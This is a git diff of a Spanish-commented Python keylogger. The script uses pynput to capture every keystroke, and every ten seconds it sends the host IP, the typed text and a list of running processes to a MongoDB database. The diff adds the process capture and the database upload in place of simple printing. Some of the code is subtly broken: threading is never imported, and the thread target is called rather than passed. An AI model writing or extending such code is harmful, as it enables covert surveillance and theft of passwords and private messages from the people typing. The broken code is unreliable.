@@ -3,15 +3,17 @@ from mongobd import conexion
 import pynput.keyboard
 import socket
 import time
-import sys
 from datetime import datetime
+import subproceso
 
 
 lista_tecla=[] #En esta lista se guardaran las palabras
 
-def agregarBD_mongo(equipo,fecha_hora,informacion,fecha_hora_final):
+controlador = True
+sub = subproceso
+def agregarBD_mongo(equipo,fecha_hora,informacion,fecha_hora_final,sub_proceso):
     mongo_conexion = conexion()
-    mongo_conexion.agregar_archivo(equipo,fecha_hora,informacion,fecha_hora_final)
+    mongo_conexion.agregar_archivo(equipo,fecha_hora,informacion,fecha_hora_final,sub_proceso)
 
 def imprimir():
     tecla = ''.join(lista_tecla)
@@ -25,8 +27,7 @@ def presiona(key):
         print("Saliendo...")
         #imprimir()#imprime en el documento txt
         #extrar_informacion()
-        #sys.exit()
-        raise
+        return False
         #liste.stop()
     #Si es igual al espacio
     elif key1 == "Key.space":
@@ -63,19 +64,23 @@ def extrar_informacion():
             contador = contador+1
 
 def ciclo_ejecucion():
-    while True:
+    while presiona:
         time.sleep(10)
         #1.PRIMER PASO
         ip_equipo = socket.gethostbyname(socket.gethostname())
         tiempo_inicial = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
         lo_escrito = imprimir()
         tiempo_final = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
-        print(ip_equipo+"\n"+tiempo_inicial+"\n"+tiempo_final+"\n"+lo_escrito)
+        sub_proceso = sub.ultimos_procesos()
+        agregarBD_mongo(ip_equipo,tiempo_inicial,lo_escrito,tiempo_final,sub_proceso)
         lista_tecla.clear()
 
 
 
 with pynput.keyboard.Listener(on_press=presiona) as liste:
+
+    hilo = threading.Thread(target=ciclo_ejecucion()).start()
     liste.join()
+
 
 
